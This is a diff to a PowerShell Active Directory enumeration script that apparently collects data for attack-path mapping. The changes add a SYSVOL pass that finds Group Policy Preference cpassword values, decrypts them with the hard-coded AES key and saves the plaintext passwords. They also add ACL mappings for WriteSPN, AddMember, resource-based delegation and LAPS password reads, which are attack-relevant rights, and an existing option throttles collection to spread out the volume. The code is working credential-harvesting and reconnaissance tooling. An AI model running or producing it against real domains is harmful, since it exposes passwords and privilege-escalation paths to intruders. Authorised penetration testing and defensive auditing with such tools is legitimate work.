@@ -15,6 +15,8 @@
       -DelayMs    throttle between collection passes (spreads out the volume).
       -Quiet      minimal console output.
       -Test       bind, verify read access, and exit (quick sanity check).
+      -Sysvol     also read SYSVOL (GPP passwords, scripts) and write a separate
+                  findings file - no admin needed.
 
 .PARAMETER Domain
     DNS domain name. Defaults to the current machine's domain.
@@ -43,7 +45,8 @@ param(
     [switch]$NoACL,
     [int]$DelayMs = 0,
     [switch]$Quiet,
-    [switch]$Test
+    [switch]$Test,
+    [switch]$Sysvol
 )
 
 $ErrorActionPreference = 'Stop'
@@ -85,7 +88,11 @@ function New-Searcher {
     param([string]$Filter, [string[]]$Props, [string]$SearchBase = '')
     $s = New-Object System.DirectoryServices.DirectorySearcher
     if ($SearchBase) {
-        $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
+        if ($Credential) {
+            $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase", $Credential.UserName, $Credential.GetNetworkCredential().Password)
+        } else {
+            $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
+        }
     } else {
         $s.SearchRoot = $script:RootEntry
     }
@@ -178,9 +185,15 @@ function Get-RightName {
             $GUID_GetChangesFilt { return 'GetChangesInFilteredSet' }
             $GUID_SelfMembership { return 'AddSelf' }
         }
+        if ($ot -and $ot -eq $script:AttrSpn) { return 'WriteSPN' }
     }
     if ($r -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty) {
-        if ($ot -eq $GUID_SelfMembership) { return 'AddMember' }
+        if ($ot -and ($ot -eq $GUID_SelfMembership -or $ot -eq $script:AttrMember)) { return 'AddMember' }
+        if ($ot -and $ot -eq $script:AttrSpn)    { return 'WriteSPN' }
+        if ($ot -and $ot -eq $script:AttrRact)   { return 'AddAllowedToAct' }
+    }
+    if ($r -band [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty) {
+        if ($ot -and $ot -eq $script:AttrLaps)   { return 'ReadLAPSPassword' }
     }
     return $null
 }
@@ -215,6 +228,69 @@ function Get-Uac {
     param($Result)
     $uac = Get-Prop $Result 'userAccountControl' 0
     try { return [int]$uac } catch { return 0 }
+}
+
+function ConvertFrom-CPassword {
+    param([string]$Value)
+    try {
+        $keyHex = '4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
+        $key = New-Object byte[] 32
+        for ($i = 0; $i -lt 32; $i++) { $key[$i] = [Convert]::ToByte($keyHex.Substring($i*2, 2), 16) }
+        $cipher = [Convert]::FromBase64String($Value)
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $aes.KeySize = 256
+        $aes.BlockSize = 128
+        $aes.Key = $key
+        $aes.IV = New-Object byte[] 16
+        $dec = $aes.CreateDecryptor()
+        $plain = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
+        $pad = [int]$plain[$plain.Length - 1]
+        if ($pad -gt 0 -and $pad -le 16) { $plain = $plain[0..($plain.Length - 1 - $pad)] }
+        return [Text.Encoding]::UTF8.GetString($plain)
+    } catch { return $null }
+}
+
+function Invoke-SysvolPass {
+    param([string]$FindingsFile)
+    $findings = New-Object System.Collections.ArrayList
+    $sysvol = "\\$Domain\SYSVOL\$Domain\Policies"
+    if (-not (Test-Path $sysvol)) {
+        Write-Warning "SYSVOL not reachable: $sysvol"
+        return
+    }
+
+    # GPP preference files that can carry cpassword
+    $gpp = Get-ChildItem -Path $sysvol -Recurse -File -Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,Drives.xml,Printers.xml -ErrorAction SilentlyContinue
+    foreach ($f in $gpp) {
+        try {
+            [xml]$xml = Get-Content $f.FullName -ErrorAction Stop
+            foreach ($n in $xml.SelectNodes("//*[@cpassword]")) {
+                $plain = ConvertFrom-CPassword $n.GetAttribute('cpassword')
+                $user  = $n.GetAttribute('userName')
+                if ($plain) {
+                    [void]$findings.Add([pscustomobject]@{ Type = 'GPP Password'; File = $f.FullName; User = $user; Secret = $plain })
+                }
+            }
+        } catch {}
+    }
+
+    # startup / shutdown / logon / logoff scripts
+    $scripts = Get-ChildItem -Path $sysvol -Recurse -File -Include *.bat,*.cmd,*.ps1,*.vbs -ErrorAction SilentlyContinue |
+        Where-Object { $_.FullName -match '\\Scripts\\' }
+    foreach ($s in $scripts) {
+        [void]$findings.Add([pscustomobject]@{ Type = 'Script'; File = $s.FullName; User = ''; Secret = '' })
+    }
+
+    if ($findings.Count -gt 0) {
+        $findings | ConvertTo-Json -Depth 4 | Set-Content -Path $FindingsFile -Encoding UTF8
+    } else {
+        Set-Content -Path $FindingsFile -Value '[]' -Encoding UTF8
+    }
+    if (-not $Quiet) {
+        Write-Host ("[+] sysvol findings     {0} items -> {1}" -f $findings.Count, $FindingsFile) -ForegroundColor Green
+    }
 }
 
 # ---------------------------------------------------------------------------
@@ -272,6 +348,27 @@ if ($Test) {
         Write-Host ("    {0,-10} {1}" -f $k, $(if ($r) {'readable'} else {'no access / empty'}))
     }
     return
+}
+
+# Resolve attribute GUIDs from the schema (for finer ACL right mapping).
+$script:SchemaGuids = @{}
+$script:AttrMember = $null; $script:AttrSpn = $null; $script:AttrLaps = $null; $script:AttrRact = $null
+try {
+    $schemaNC = $rootDse.Properties['schemaNamingContext'][0].ToString()
+    $schFilter = "(|(lDAPDisplayName=member)(lDAPDisplayName=servicePrincipalName)(lDAPDisplayName=ms-Mcs-AdmPwd)(lDAPDisplayName=msDS-AllowedToActOnBehalfOfOtherIdentity))"
+    $sch = New-Searcher -Filter $schFilter -Props @('lDAPDisplayName','schemaIDGUID') -SearchBase $schemaNC
+    foreach ($r in (Get-AllResults $sch)) {
+        $nm = Get-Prop $r 'lDAPDisplayName'
+        if ($nm -and $r.Properties.Contains('schemaIDGUID')) {
+            $script:SchemaGuids[$nm] = Get-Guid $r.Properties['schemaIDGUID'][0]
+        }
+    }
+    $script:AttrMember = $script:SchemaGuids['member']
+    $script:AttrSpn    = $script:SchemaGuids['servicePrincipalName']
+    $script:AttrLaps   = $script:SchemaGuids['ms-Mcs-AdmPwd']
+    $script:AttrRact   = $script:SchemaGuids['msDS-AllowedToActOnBehalfOfOtherIdentity']
+} catch {
+    Write-Warning "Schema lookup failed; finer ACL rights will be skipped."
 }
 
 # ---------------------------------------------------------------------------
@@ -615,6 +712,10 @@ Write-DataFile 'domains'    'domains'    ($domainNodes + $trustEdges)
 Write-DataFile 'ous'        'ous'        $ouNodes
 Write-DataFile 'gpos'       'gpos'       $gpoNodes
 Write-DataFile 'containers' 'containers' $containerNodes
+
+if ($Sysvol) {
+    Invoke-SysvolPass -FindingsFile (Join-Path $OutputDir "${ts}_sysvol_findings.json")
+}
 
 $zip = "$out.zip"
 Compress-Archive -Path (Join-Path $out '*.json') -DestinationPath $zip -Force
